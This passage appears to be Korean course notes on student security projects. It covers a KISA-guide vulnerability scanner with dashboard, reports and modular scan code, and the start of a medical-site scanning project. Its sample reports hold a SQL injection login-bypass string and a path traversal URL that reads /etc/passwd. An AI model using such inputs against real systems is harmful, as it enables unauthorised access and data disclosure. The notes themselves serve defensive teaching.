   - 로그 및 백업 상태 모니터링

**대시보드 특징**:
- 실시간 업데이트 (WebSocket 사용)
- 필터링 및 정렬 기능
- 엑셀 다운로드 기능
- 상세 진단 이력 추적

#### 대상 관리 페이지

**기능**:
- 진단 대상 추가/수정/삭제
- 입력 항목:
  - 대상명 (예: "커뮤니티 사이트")
  - URL (예: "http://community.team1.local")
  - IP 주소 (예: "192.168.1.100")
  - 설명 (예: "보안 소셜 커뮤니티 플랫폼")
  - 담당자 (예: "강호혁")

**대상 목록 표시**:
| 대상명 | URL | IP | 담당자 | 등록일 | 작업 |
|-------|-----|-----|-------|--------|------|
| 커뮤니티 사이트 | http://... | 192.168.1.100 | 강호혁 | 2025-01-06 | 수정/삭제 |

#### 진단 실행 페이지

**2단계 진단 프로세스**:

**1단계: 크롤링**
```
[진단 대상 선택] → [크롤링 시작]
                ↓
        웹사이트 전체 URL 수집
                ↓
        수집된 URL 목록 표시
        (예: 152개 URL 발견)
```

**2단계: 취약점 스캔**
```
[취약점 항목 선택]
☑ W-01: SQL Injection
☑ W-02: XSS
☑ W-03: CSRF
☐ W-04: File Upload
☑ W-05: Path Traversal
...
[전체 선택] [전체 해제]
        ↓
    [진단 시작]
        ↓
진단 실행 중... (Progress Bar)
        ↓
    진단 완료
```

**진단 실행 화면**:
```
진단 진행 중...
━━━━━━━━━━━━━━━━━━━━━━━━━━━ 45%

현재 작업: SQL Injection 테스트 중...
처리된 URL: 68/152
발견된 취약점: 12개
경과 시간: 00:02:34
```

#### 리포트 페이지

**리포트 카드**:
```
┌──────────────────────────────────────────┐
│ 진단 리포트 #2025010601                    │
├──────────────────────────────────────────┤
│ 상태: ✅ 완료                              │
│ 진단 일시: 2025-01-06 14:05:23            │
│ 대상: 커뮤니티 사이트                       │
│ 진단 항목: 18개                            │
│ 발견된 취약점: 15개                         │
│   - Critical: 5개                         │
│   - High: 7개                             │
│   - Medium: 3개                           │
├──────────────────────────────────────────┤
│ [상세보기] [엑셀 다운로드] [PDF 다운로드]    │
└──────────────────────────────────────────┘
```

**상세 리포트 내용**:

| 진단 항목 | 판정 | 심각도 | 증거 | 권고사항 |
|----------|------|--------|------|---------|
| W-01: SQL Injection | 취약 | Critical | http://.../login.jsp?username=admin'... | Prepared Statement 사용 |
| W-02: XSS | 취약 | High | http://.../board_view.jsp?id=5 (스크립트 실행됨) | HTML 인코딩 적용 |
| W-05: Path Traversal | 취약 | High | http://.../download?file=../../etc/passwd | 경로 정규화 및 검증 |
| W-09: Cookie HTTPOnly | 취약 | Medium | JSESSIONID 쿠키에 HTTPOnly 플래그 없음 | 쿠키 보안 플래그 설정 |
| ... | ... | ... | ... | ... |

**권고사항 상세 (W-01 예시)**:

```markdown
## W-01: SQL Injection 취약점

### 발견 위치
- URL: http://community.team1.local/login.jsp
- 파라미터: username, password

### 취약점 상세
사용자 입력을 검증 없이 SQL 쿼리에 직접 삽입하여 인증 우회 및
데이터베이스 정보 유출이 가능합니다.

### 공격 시나리오
Username: admin' OR '1'='1'--
Password: (임의 값)

결과: 관리자 권한으로 로그인 성공

### 권고사항
1. Prepared Statement 사용
2. 입력값 검증 (화이트리스트 방식)
3. 에러 메시지 노출 제한
4. 최소 권한 원칙 적용 (DB 계정)

### 참고 가이드
- KISA 주요정보통신기반시설 기술적 취약점 분석·평가 가이드 W-01
- OWASP Top 10 2021 - A03: Injection
- CWE-89: SQL Injection
```

### 4.7.3 시스템 진단 시연

**시연 과정**:

1. **대상 서버에서 진단 스크립트 실행**
```bash
[root@target-server ~]# cd /opt/security_check/system
[root@target-server system]# ./scan.sh

[2025-01-06 14:05:23] 시스템 보안 진단 시작...
[2025-01-06 14:05:24] ✅ S-01: 기본 계정 존재 여부 - 양호
[2025-01-06 14:05:25] ❌ S-02: 패스워드 정책 - 취약 (최소 길이 미흡)
[2025-01-06 14:05:26] ⚠️  S-03: SUID 파일 - 경고 (위험 파일 2개 발견)
...
[2025-01-06 14:07:15] 진단 완료. 리포트 생성 중...
[2025-01-06 14:07:16] 리포트 저장: /opt/security_check/reports/system/system_scan_20250106_140523.json
[2025-01-06 14:07:17] 진단 서버로 전송 중...
[2025-01-06 14:07:18] ✅ 전송 성공 (HTTP 200)
```

2. **진단 서버 대시보드에서 확인**
```
시스템 대시보드 업데이트됨!

최근 진단 결과:
- 서버: target-server (192.168.1.100)
- 진단 시간: 2025-01-06 14:05:23
- 총 67개 항목 진단
- 취약: 18개
- 경고: 12개
- 양호: 37개

심각도별 통계:
━━━━━━━━━━━━━━━━━━━━━
Critical:  ███░░░░░░░  3개 (4.5%)
High:      ████████░░ 15개 (22.4%)
Medium:    █████░░░░░ 10개 (14.9%)
Low:       ███░░░░░░░  2개 (3.0%)
양호:      ████████████████████ 37개 (55.2%)
━━━━━━━━━━━━━━━━━━━━━
```

3. **엑셀 다운로드**

시연에서 강조한 기능은 **엑셀 형식의 리포트 다운로드**였습니다.

엑셀 파일 구조:
- Sheet 1: 요약 (Summary)
- Sheet 2: 상세 진단 결과 (Details)
- Sheet 3: 권고사항 (Recommendations)
- Sheet 4: 참고 자료 (References)

---

## 4.8 진단 결과 및 리포트 생성

### 4.8.1 리포트 형식

1조는 다양한 형식의 리포트를 제공했습니다:

1. **웹 대시보드** (실시간 조회)
2. **엑셀 파일** (Excel .xlsx)
3. **PDF 파일** (인쇄용)
4. **JSON 파일** (API 연동용)

### 4.8.2 리포트 구성 요소

**1. 중복 항목 통합**

1조가 강조한 특징은 **"중복되는 진단 항목과 권고사항을 하나로 묶어서 가독성을 높였다"**는 점입니다.

예시:
```
❌ 중복 전:
- W-01 SQL Injection in /login.jsp
- W-01 SQL Injection in /board_write.jsp
- W-01 SQL Injection in /comment_write.jsp
- W-01 SQL Injection in /admin/user_search.jsp

✅ 중복 제거 후:
- W-01 SQL Injection
  발견 위치 (4개):
  1. /login.jsp (username 파라미터)
  2. /board_write.jsp (search 파라미터)
  3. /comment_write.jsp (comment 파라미터)
  4. /admin/user_search.jsp (query 파라미터)

  권고사항: Prepared Statement 사용 (전체 적용 필요)
```

**2. 권고사항 통합**

KISA 가이드에서 제공하는 표준 권고사항을 각 진단 항목에 포함:

```markdown
## 권고사항 (W-01: SQL Injection)

### 단기 조치 (긴급)
1. 모든 DB 쿼리를 Prepared Statement로 변경
2. 사용자 입력 검증 강화 (화이트리스트 방식)
3. DB 에러 메시지 노출 제한

### 중기 조치 (1개월 내)
1. ORM (Object-Relational Mapping) 도입 검토
2. 입력 검증 라이브러리 적용
3. Web Application Firewall (WAF) 도입

### 장기 조치 (3개월 내)
1. 개발자 보안 코딩 교육
2. 코드 리뷰 프로세스 강화
3. SAST (Static Application Security Testing) 도구 도입

### 참고 가이드
- KISA 주요정보통신기반시설 기술적 취약점 분석·평가 가이드 W-01
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
```

### 4.8.3 엑셀 리포트 상세 구조

**Sheet 1: 요약 (Summary)**

```
A열        B열              C열       D열
────────────────────────────────────────
진단 정보
────────────────────────────────────────
진단 일시   2025-01-06 14:05:23
진단 대상   커뮤니티 사이트
대상 URL    http://community.team1.local
대상 IP     192.168.1.100
진단 항목   111개 (웹 18 + 시스템 67 + DBMS 26)

────────────────────────────────────────
진단 결과 요약
────────────────────────────────────────
분류        항목 수    취약    경고    양호
────────────────────────────────────────
웹          18        15      2       1
시스템      67        18      12      37
DBMS        26        8       5       13
────────────────────────────────────────
합계        111       41      19      51
            (100%)    (36.9%) (17.1%) (45.9%)

────────────────────────────────────────
심각도별 통계
────────────────────────────────────────
심각도      개수      비율
────────────────────────────────────────
Critical    8         7.2%
High        22        19.8%
Medium      18        16.2%
Low         12        10.8%
양호        51        45.9%
```

**Sheet 2: 상세 진단 결과 (Details)**

| A | B | C | D | E | F | G |
|---|---|---|---|---|---|---|
| 번호 | 진단 항목 | 카테고리 | 판정 | 심각도 | 증거 | 권고사항 |
| 1 | W-01: SQL Injection | 입력검증 | 취약 | Critical | /login.jsp (username) | Prepared Statement 사용 |
| 2 | W-02: XSS | 입력검증 | 취약 | High | /board_view.jsp (title) | HTML 인코딩 적용 |
| ... | ... | ... | ... | ... | ... | ... |

**Sheet 3: 권고사항 (Recommendations)**

각 취약점에 대한 상세 권고사항 및 코드 예시 포함

**Sheet 4: 참고 자료 (References)**

- KISA 가이드 링크
- OWASP 참고 자료
- CWE 링크
- CVE 정보 (해당 시)

---

## 4.9 통계 및 자체 평가

1조는 자체적으로 프로젝트를 평가한 통계를 발표했습니다.

### 4.9.1 가이드 반영률 및 진단 성공률

| 분야 | KISA 가이드 항목 | 구현 항목 | 반영률 | 진단 성공률 |
|-----|-----------------|----------|--------|------------|
| **웹** | 20개 | 18개 | 90% | 95% |
| **시스템** | 67개 | 67개 | 100% | 92% |
| **DBMS** | 30개 | 26개 | 86.7% | 88% |
| **합계** | 117개 | 111개 | 94.9% | 91.7% |

**주석**: "저희가 진단한 것이기 때문에 좀 높게 평가를 한 점이 있습니다." - 팀장 강호혁

### 4.9.2 진단 성공률 상세

**웹 취약점 진단 성공률: 95%**

- 성공적으로 탐지: 17/18개
- 탐지 실패: 1개 (W-16: SSTI - 구현했으나 진단 스크립트 미완성)

**시스템 취약점 진단 성공률: 92%**

- 성공적으로 탐지: 62/67개
- 탐지 실패: 5개
  - S-32: 커널 파라미터 설정 (복잡도 높음)
  - S-45: SELinux 정책 상세 분석 (시간 부족)
  - S-53: 로그 포렌식 분석 (도구 부족)
  - S-61: 침입 탐지 시스템 (IDS 미구축)
  - S-66: 보안 컴플라이언스 검증 (범위 초과)

**DBMS 취약점 진단 성공률: 88%**

- 성공적으로 탐지: 23/26개
- 탐지 실패: 3개
  - D-18: 트랜잭션 로그 암호화 (고급 기능)
  - D-22: 데이터 마스킹 (별도 도구 필요)
  - D-24: 실시간 쿼리 모니터링 (성능 이슈)

### 4.9.3 개발 기간 및 팀 노력

**전체 개발 기간**: 5일 (연휴 포함)

**일정별 작업 내역**:

| 날짜 | 주요 작업 | 비고 |
|-----|----------|------|
| Day 1 | 프로젝트 기획, 역할 분담 | 팀 회의 |
| Day 2 | 커뮤니티 사이트 구축 시작 | 구축팀 3명 |
| Day 3 | 취약점 구현, 진단 스크립트 작성 시작 | 전체 팀원 |
| Day 4 (연휴) | 진단 스크립트 완성, 대시보드 개발 | **연휴에도 작업** |
| Day 5 | 통합 테스트, 리포트 기능 완성 | 마무리 |

팀장의 소감: "쉬는 기간에도 팀원분들이 적극적으로 참여를 해주셔서 이 정도 완성도를 낼 수 있지 않았나라고 생각합니다."

---

## 4.10 모듈화 및 확장성

1조는 **확장 가능한 아키텍처**를 설계했습니다.

### 4.10.1 시스템 진단 모듈화

**checks/ 디렉터리 기반 자동 확장**

```bash
# 디렉터리 구조
/opt/security_check/system/checks/
├── S-01_default_accounts.sh
├── S-02_password_policy.sh
├── S-03_suid_files.sh
├── ...
└── S-67_compliance_check.sh

# 새로운 점검 항목 추가 방법
$ cd /opt/security_check/system/checks/
$ vi S-68_custom_check.sh

#!/bin/bash
# 새로운 점검 스크립트 작성
...

$ chmod +x S-68_custom_check.sh

# 다음 실행 시 자동으로 포함됨 (코드 수정 불필요)
```

**scan.sh의 자동 탐색 로직**:

```bash
# 메인 스크립트에서 checks/ 디렉터리의 모든 .sh 파일 실행
for check_script in ${SCRIPT_DIR}/checks/*.sh; do
    if [ -f "$check_script" ]; then
        bash ${check_script} >> ${REPORT_FILE}
    fi
done
```

**장점**:
- 새로운 취약점 항목 추가 시 **메인 스크립트 수정 불필요**
- 점검 스크립트를 독립적으로 개발/테스트 가능
- 팀원 간 병렬 작업 용이

### 4.10.2 웹 진단 모듈화

**scan.py의 모듈 구조**

```python
# scan.py

from scanners.sql_injection import SQLInjectionScanner
from scanners.xss import XSSScanner
from scanners.csrf import CSRFScanner
from scanners.file_upload import FileUploadScanner
# ... 총 18개 스캐너 임포트

# 스캐너 목록 (동적 로딩)
SCANNERS = [
    SQLInjectionScanner,
    XSSScanner,
    CSRFScanner,
    FileUploadScanner,
    PathTraversalScanner,
    CommandInjectionScanner,
    # ... 총 18개
]

def run_selected_scans(target_urls, selected_scanners):
    results = []

    for scanner_class in SCANNERS:
        scanner_name = scanner_class.__name__

        # 사용자가 선택한 스캐너만 실행
        if scanner_name in selected_scanners:
            scanner = scanner_class(target_urls)
            result = scanner.scan()
            results.append(result)

    return results
```

**새로운 스캐너 추가 방법**:

```python
# scanners/new_vulnerability.py

class NewVulnerabilityScanner:
    def __init__(self, target_urls):
        self.target_urls = target_urls
        self.name = "W-19: New Vulnerability"
        self.severity = "High"

    def scan(self):
        findings = []

        for url in self.target_urls:
            # 취약점 진단 로직
            if self.check_vulnerability(url):
                findings.append({
                    "url": url,
                    "result": "취약",
                    "evidence": "...",
                    "recommendation": "..."
                })

        return findings

    def check_vulnerability(self, url):
        # 실제 진단 로직
        pass
```

```python
# scan.py에 추가
from scanners.new_vulnerability import NewVulnerabilityScanner

SCANNERS.append(NewVulnerabilityScanner)
```

**강사 피드백 반영**:

강사: "웹 쪽은 이제 실행을 할 때 스크립트를 선택하는 단계가 있어서 전체를 일괄 실행시키게 설정하지는 못했고, 필요한 항목만 선택해서 실행하도록 해뒀습니다."

팀장: "네, 맞습니다. 하지만 확장성을 위해서 스캔 파일 코드 밑에 추가만 하면 작동을 할 수 있도록 확장성을 높여 놨습니다."

### 4.10.3 확장성 설계 평가

**확장성 점수**: A+

**평가 근거**:
1. **모듈 기반 아키텍처**: 새로운 취약점 모듈 추가가 용이
2. **플러그인 방식**: 기존 코드 수정 최소화
3. **독립적 개발**: 각 모듈을 독립적으로 개발/테스트 가능
4. **자동 탐색**: 디렉터리 기반 자동 로딩

**향후 확장 계획**:
- 다양한 웹 프레임워크 지원 (Django, Spring Boot, Express.js)
- 컨테이너 환경 진단 (Docker, Kubernetes)
- 클라우드 보안 점검 (AWS, Azure, GCP)
- AI 기반 이상 탐지

---

## 4.11 프로젝트 최종 평가

1조는 자체 평가를 다음과 같이 제시했습니다.

### 4.11.1 자체 평가표

| 평가 항목 | 점수 | 근거 |
|----------|------|------|
| **진단 항목 개수** | A+ | 웹 18개, 시스템 67개, DBMS 26개 (총 111개) |
| **스크립트 완성도** | A+ | 팀원들이 프로젝트 기간 내에 최선을 다해서 작성 |
| **확장성** | A+ | 모듈 기반 아키텍처, 새로운 취약점 추가 용이 |
| **사용자 편의성** | A | 웹 기반 대시보드, 엑셀 다운로드, 직관적 UI |
| **리포트 품질** | A | 상세한 증거, 권고사항, 참고 자료 제공 |
| **KISA 가이드 준수** | A+ | 94.9% 반영률 (111/117개) |

**종합 평가**: A+

### 4.11.2 강사 평가

강사는 1조의 프로젝트에 대해 매우 긍정적인 평가를 제공했습니다:

**발표 내용 및 구성**: "발표 내용도 좋았고요. 발표 구성도 좋았고 잘하셨어요."

**사이트 구축**: "일단 사이트 구축은 기본적인 기능들인데 기본적인 기능들에서 필요한 세부 기능까지 촘촘하게 빠진 걸 볼 수 있었고요."

**진단 도구 완성도**: "취약점 진단 스크립트도 웹상에서 저는 사실 5일 긴 기간이 아니었기 때문에 이렇게 웹상에서 관리도구까지 쭉 만들어줄 거라고는 생각도 못 했었는데 굉장히 완성도 높게 잘 만들어줬다고 판단이 돼요."

**팀워크**: 강사가 팀 역할 분담에 대해 질문했을 때, 팀장의 답변:

"저희가 슈틸러즈 기간 중간중간에 연휴가 좀 있었습니다. 쉬는 날이 좀 있었는데 쉬는 기간에도 팀원분들이 적극적으로 참여를 해주셔서 이 정도 완성도를 낼 수 있지 않았나라고 생각을 하고요. 그리고 본인들이 맡은 파트가 아님에도 불구하고 본인들이 하는 일이 좀 빨리 끝나면 다른 분이 막혔던 거를 같이 해결하는 방식으로 좀 많이 서로 도와가면서 진행을 했던 것 같습니다."

강사: "알겠습니다. 짧은 시간에 완성도 꽤 구현 참 잘 해주셨고요. 발표 잘 들었습니다."

---

## 4.12 Q&A 세션 및 강사 피드백

### 4.12.1 원격 진단 vs 로컬 진단 논의

**강사 질문**: "시연을 보니까 웹 쪽은 웹 안에서 진단이나 이런 것들이 다 자동화가 돼 있었는데 시스템 점검 쪽이나 DB 점검 쪽은 다 CLI로 진행하고 진행된 결과 리포트를 전송하는 방식으로 구현을 한 거죠?"

**팀장 답변**: "맞습니다. 근데 이제 여기도 자동화라고 하자면 크론에다가 등록을 해놓고 자동으로 시행되고 전송이 되게끔 설정을 해두었습니다."

**강사 피드백**: "그때 필요에 따라서 웹 베이스에서도 아까 처음에 얘기할 때 초보자들도 사용하기 쉽도록이라는 모토를 내세웠었는데 웹 안에서 그냥 체크리스트에서 선택하고 점검 방법을 선택하고 점검할 수 있게 만들었으면 더 좋았겠다라는 생각이 들었어요."

**팀장 답변**: "근데 그 부분은 저희가 이제 그 부분을 실행하기 위해서는 원격으로 쉘을 실행시키는 방식이 되어버리면 굉장히 취약점이라고 생각을 해서 쉘을 실행시키는 것 자체가 문제다. 그래서 외부 안에 이제 보안, V3처럼 외부에서 돌아갈 수 있는 방식으로 설계를 했던 것 같습니다."

**강사의 심화 피드백**: "그것도 맞아요. 그것도 맞고 지금 이게 **양날의 검**인데 편의성을 높이면 위험해지고 위험을 낮추려면 불편해질 수밖에 없거든요."

"여러 가지 환경이 있는데요. 어디에 들어가면 어떤 기관에서는 자기들 서버에 데이터를 우리가 어떤 프로그램이나 이런 걸 함부로 돌릴 수 있게 허가를 안 내줘요. 원격에서 니네가 장비를 가지고 들어와 우리가 계정은 제공해줄 수 있어 이런 식으로 접근하는 데가 있고..."

"그리고 또 하나 문제가 이런 식으로 소스를 그쪽에 올려버리면 **소스 공개, 소스 노출**에 또 위험이 있잖아요. 이게 만약에 우리 회사 재산이라고 한다면 우리 회사에서 기껏 개발한 건데 저쪽에서 돌아갈 수 있게 구현을 해놓고 그쪽에서 돌려버리면 그게 약간은 임대 형식이 아니라 그 안에서 우리 재산이 돌아가고 그게 나중에 소거되지 않고 남아있게 되는 경우에 발생할 수 있는 **재산권 침해** 이런 것도 고민을 해야 될 거거든요."

"그래서 양쪽 다 일리는 있어요. 그래서 그렇게 말씀을 하신다면 그것도 방법이고 하여튼 구현은 잘 해줬고요."

### 4.12.2 프로젝트 소감

**강사 질문**: "프로젝트 느낀 점 하나만 얘기해 주실래요?"

**팀장 답변**: "느낀 점이요. 생각보다 오히려 짧았고 다들 이번에는 주말이 껴 있어서 좀 프로젝트를 완성할 수 있었지만 나중에 최종 프로젝트 때 더 열심히 해야겠다는 생각이 좀 들었습니다."

**강사 최종 코멘트**: "네 짧은 시간에 완성도 꽤 구현 참 잘 해주셨고요. 발표 잘 들었습니다."

---

## 4.13 팀 역할 분담 및 프로젝트 소감

### 4.13.1 팀 구성

**팀원**: 총 5명

| 이름 | 역할 | 주요 담당 업무 |
|-----|------|---------------|
| 강호혁 (팀장) | 프로젝트 총괄, 웹 진단 | 프로젝트 기획, 웹 취약점 구현, 진단 스크립트 작성 |
| 팀원 A | 사이트 구축 | 커뮤니티 사이트 프론트엔드, 백엔드 개발 |
| 팀원 B | 사이트 구축 | 데이터베이스 설계, API 개발 |
| 팀원 C | 시스템 진단 | 시스템 취약점 진단 스크립트 67개 작성 |
| 팀원 D | DBMS 진단, 대시보드 | DBMS 진단 스크립트 26개, 진단 대시보드 개발 |

### 4.13.2 협업 방식

**팀장의 설명**:

"본인들이 맡은 파트가 아님에도 불구하고 본인들이 하는 일이 좀 빨리 끝나면 다른 분이 막혔던 거를 같이 해결하는 방식으로 좀 많이 서로 도와가면서 진행을 했던 것 같습니다."

**연휴 기간 작업**:

"저희가 슈틸러즈 기간 중간중간에 연휴가 좀 있었습니다. 쉬는 날이 좀 있었는데 쉬는 기간에도 팀원분들이 적극적으로 참여를 해주셔서 이 정도 완성도를 낼 수 있지 않았나라고 생각을 합니다."

### 4.13.3 프로젝트 소감

**팀장**:
"생각보다 오히려 짧았고 다들 이번에는 주말이 껴 있어서 좀 프로젝트를 완성할 수 있었지만 나중에 최종 프로젝트 때 더 열심히 해야겠다는 생각이 좀 들었습니다."

---

## 4.14 종합 평가 및 인사이트

### 4.14.1 프로젝트의 핵심 가치

1조가 강조한 **3가지 핵심 가치**:

#### 1. 사용자 중심의 쉬운 보안 진단

"웹 기반 진단 도구를 통해서 CLI보다 쉽게 점검을 할 수 있는 환경을 구축했습니다. 보안 지식이 낮은 사용자들도 사이트 취약점을 쉽게 진단할 수 있습니다."

**타겟 사용자**:
- 상시 점검이 필요하지만 인력이 부족한 서비스 운영자
- JSP, Python 환경에서 보안 코딩 가이드가 필요한 개발자
- 반복 진단 프로세스를 자동화해서 효율을 높이고 싶은 보안 관제 및 분석 조직

#### 2. 가이드 기반 보안 지침 제공

"점검된 항목마다 표준 가이드를 제공해서 사용자가 문제를 해결하는 방향을 제시를 해줍니다."

**제공하는 가이드**:
- KISA 주요정보통신기반시설 기술적 취약점 분석·평가 가이드
- OWASP Top 10 2021
- CWE (Common Weakness Enumeration)
- 실무 적용 가능한 코드 예시

#### 3. 집약적인 정보를 통해 빠른 의사결정

"대시보드를 통해 객관적인 지표를 제공하고 사용자가 현재 위험 상황을 즉각적으로 파악하고 행동할 수 있도록 돕고 보안 대응의 속도를 높일 수 있습니다."

**대시보드의 역할**:
- 취약점 심각도 시각화
- 우선순위 결정 지원
- 진단 이력 추적
- 통계 및 추이 분석

### 4.14.2 프로젝트의 차별화 포인트

**다른 팀과의 비교**:

| 비교 항목 | 1조 | 다른 팀들 (일반적) |
|----------|-----|-------------------|
| **진단 항목 수** | 111개 (웹 18 + 시스템 67 + DBMS 26) | 평균 30-50개 |
| **웹 기반 도구** | ✅ 완전한 대시보드 시스템 | ⚠️ 부분적 구현 또는 CLI 중심 |
| **리포트 형식** | 웹, 엑셀, PDF, JSON | 주로 1-2가지 형식 |
| **확장성** | 모듈 기반, 디렉터리 자동 탐색 | 하드코딩 방식 |
| **권고사항 통합** | ✅ 중복 제거, KISA 가이드 통합 | 개별 나열 |
| **크론 자동화** | ✅ 시스템/DBMS 진단 자동 실행 | 수동 실행 |

### 4.14.3 실무 적용 가능성

**강점**:
1. **KISA 가이드 기반**: 공공기관, 금융권에서 바로 활용 가능
2. **웹 기반 인터페이스**: 비기술 관리자도 사용 가능
3. **자동화**: 인력 부족 문제 해결
4. **확장성**: 새로운 취약점 추가 용이

**한계 및 개선 방향**:
1. **오탐(False Positive) 가능성**: AI/ML 기반 학습으로 정확도 개선 필요
2. **성능 최적화**: 대규모 사이트 진단 시 시간 소요 → 비동기 처리, 분산 스캐닝 도입
3. **다양한 환경 지원**: 현재 JSP/MySQL 중심 → Django, Spring Boot, PostgreSQL 등 확장
4. **클라우드 네이티브**: 컨테이너, Kubernetes 환경 진단 기능 추가

### 4.14.4 프로젝트의 교육적 가치

**학습 성과**:
1. **KISA 가이드 실전 적용**: 이론만 배운 것이 아니라 111개 항목을 직접 구현
2. **취약점 이해**: 취약점을 의도적으로 구현하면서 공격 원리와 방어 기법 체득
3. **자동화 설계**: 반복 작업을 자동화하는 엔지니어링 경험
4. **팀워크**: 5명이 역할을 분담하고 서로 도우며 완성도 높은 결과물 도출

### 4.14.5 최종 인사이트

**등잔 밑이 어둡다**

1조는 "보안 회사나 보안 커뮤니티조차 해킹 피해를 당한다"는 현실을 직시하고, 보안 조직 자신의 시스템을 점검하는 도구를 만들었습니다.

**FireEye 사례**:
- 2020년, 세계적인 보안 회사 FireEye가 해킹당함
- 레드팀 도구 유출
- 보안 전문가들도 방심하면 공격당할 수 있음을 증명

**1조의 메시지**:
"보안 커뮤니티조차 운영 구조위로 기초 취약점이 생기고 그게 공격의 시작점이 될 수 있습니다. 안전지대는 없습니다."

**지속적인 점검의 중요성**

"자동화된 취약점 진단을 통해서 보안 점검 효율을 극대화하고 취약점 발생에 대응해서 신속하고 안정적인 보안 대응을 지원합니다."

---

## 4.15 Section 4 종합 정리 (1조 프로젝트)

### 프로젝트 요약

**프로젝트명**: 생성형 AI를 활용한 주요정보통신기반시설 취약점 진단 자동화 도구

**팀**: 1조 (팀장: 강호혁, 팀원 5명)

**개발 기간**: 5일 (연휴 포함)

**핵심 성과**:
- 111개 진단 항목 구현 (웹 18 + 시스템 67 + DBMS 26)
- 웹 기반 통합 대시보드
- 엑셀/PDF/JSON 리포트 생성
- 모듈 기반 확장 가능 아키텍처
- KISA 가이드 94.9% 반영

**기술 스택**:
- 커뮤니티 사이트: JSP, MySQL, Tomcat
- 진단 시스템: Python, Bash, Linux
- 대시보드: 웹 프론트엔드 (상세 미공개)

**설계 철학**:
- 보안성 우선 (원격 셸 실행 배제)
- 사용자 편의성 (웹 기반 인터페이스)
- 확장성 (모듈 기반 아키텍처)
- 실무 적용성 (KISA 가이드 준수)

**강사 평가**: "굉장히 완성도 높게 잘 만들어줬다", "짧은 시간에 완성도 꽤 구현 참 잘 해주셨고요"

**팀 소감**: "나중에 최종 프로젝트 때 더 열심히 해야겠다는 생각이 들었습니다"

---

**주요 학습 포인트**:

1. **보안 취약점 이해**: SQL Injection, XSS, Path Traversal, SUID 파일 등 실제 구현을 통한 깊은 이해
2. **KISA 가이드 실무 적용**: 이론을 넘어 111개 항목을 실제 스크립트로 구현
3. **보안과 편의성의 트레이드오프**: 원격 실행 vs 로컬 실행의 양날의 검
4. **자동화 설계**: 반복 작업을 효율화하는 엔지니어링 사고
5. **팀워크**: 연휴에도 작업하며 서로 도우며 완성도 높은 결과 도출

**실무 적용 시사점**:
- 소스 코드 보호와 고객 요구사항의 균형
- 다양한 고객 환경에 대응하는 유연한 설계
- 지속적인 보안 점검의 자동화 필요성

---

**(Section 4 Part 2 완료)**

**다음 작업**: Section 5 (4조 + 5조 프로젝트) 작성 예정
# Section 5: 4조 + 5조 프로젝트

## 5.1 4조 프로젝트: Safety Medical Center - 의료 데이터 보호 웹 진단 시스템

### 5.1.1 프로젝트 개요

**팀**: 4조 (팀장: 윤창현, 팀원 5명)

**프로젝트명**: Safety Medical Center - 의료 데이터 유출 방지를 위한 웹 취약점 자동 진단 시스템

**개발 기간**: 5일 (연휴 포함)

**프로젝트 목표**:
- 병원 웹사이트 구축
- 취약점 자동 진단 시스템 개발
- 의료 데이터 보호의 중요성 학습

### 5.1.2 프로젝트 배경: 의료 데이터의 중요성

#### 왜 의료 데이터인가?

4조는 **미래학자 제이슨 쉔커의 저서 "코로나 이후의 세계"**를 인용하며 프로젝트 주제를 선정한 배경을 설명했습니다.

> "앞으로 메디컬이라는 분야는 더욱 더 중요해질 것이다. 이러한 트렌드에 맞춰서 의료 데이터도 계속 더 중요해질 것입니다."

#### 초개인화 시대의 의료 데이터

"특히 지금은 **초개인화 트렌드**를 따라가고 있는 이 현대 사회에서 환자 한 명 한 명에 대한 데이터가 더욱 더 세밀해지고 더욱 더 민감해지고 그런 데이터들이 계속 생겨날 것입니다."

#### 의료 데이터의 특징

| 특징 | 설명 | 보호 필요성 |
|-----|------|------------|
| **민감도** | 환자의 병력, 유전 정보, 진료 기록 | ⚠️ 극도로 민감 |
| **자산 가치** | 다크웹에서 높은 가격에 거래됨 | 💰 경제적 가치 높음 |
| **생명 연관성** | 단순 데이터가 아닌 환자 생명 보호 | 🚑 생명과 직결 |
| **법적 요구** | 개인정보보호법, 의료법 준수 필요 | ⚖️ 법적 의무 |

"의료 데이터는 민감도가 높고 그리고 자산 가치도 높습니다. 그래서 이 데이터들은 그냥 데이터를 단순히 보호하는 것 뿐만 아니라 **환자의 생명을 보호하기 위해서** 지켜야 하는 필수 요소가 됩니다."

#### 현실 위협: 최근 6년간 병원 대상 사이버 침해 사고

"최근 6년간 사이버 침해 병원 대상으로 한 사이버 침해 사고가 **100건** 정도 발생을 했습니다."

#### 수동 진단의 한계와 자동화의 필요성

"이런 웹사이트들을 수동으로 진단을 하게 되면 되게 **시간도 많이 들어갔고 인력도 많이 들어갔고** 그래서 그런 한계가 있는데 그런 한계를 좀 극복해보고자 **자동 진단**을 좀 생각을 해보게 되었습니다."

### 5.1.3 팀 구성 및 역할 분담

| 이름 | 역할 | 주요 담당 업무 |
|-----|------|---------------|
| 윤창현 (팀장) | 프로젝트 총괄 | 전반적인 프로젝트 관리, 취약점 자료 조사 |
| 안태경 | 프론트엔드 개발 | HTML, CSS 웹 UI 개발 |
| 박상준 | 백엔드 개발 | Flask 서버 개발, API 구현 |
| 정신현 | 백엔드 및 인프라 | AWS 인프라 구축, Flask 개발 |
| 남수민 | 취약점 연구 | 취약점 자료 조사, 체크리스트 작성 |

#### 팀워크 강조

팀장의 소감:

"저희는 이런 식으로 진행이 됐고 저희가 참 감사했던 게 **팀원 한 분 한 분들이 너무 열심히 잘 해주셔가지고** 휴일인데도 계속 잘 진행해 주시고 또 주말 동안에도 쉬고 싶으셨을 텐데 열심히 잘 해주셔 가지고 프로젝트가 조금 더 발전적이지 않나 이렇게 생각을 합니다."

### 5.1.4 기술 스택

| 분야 | 기술 |
|-----|------|
| **백엔드** | Python Flask |
| **프론트엔드** | HTML, CSS |
| **스캐너 시각화** | Streamlit |
| **인프라** | AWS (EC2, VPC, ALB, RDS) |
| **데이터베이스** | (명시되지 않음, 추정 MySQL/PostgreSQL) |

### 5.1.5 AWS 인프라 아키텍처

#### 3-Tier 아키텍처 구성


#### 아키텍처 설명

"먼저 저희가 병원 웹사이트를 사용할 EC2, **Private Subnet**에서 EC2 인스턴스를 두 개를 만듭니다. 웹서버 1, 웹서버 2 그리고 여기 사용할 데이터베이스를 만들었습니다. 이게 사설망에 들어가 있는 거고 이 사설망에 접속하기 위해서 사용자는 이 **Load Balancer**를 통해서 인터넷으로 이렇게 접속을 하게 되는 거고 그리고 관리자 같은 경우에는 SSH로 접속을 하기 위해서 **Bastion Host**를 통해서 접속을 하게 됩니다."

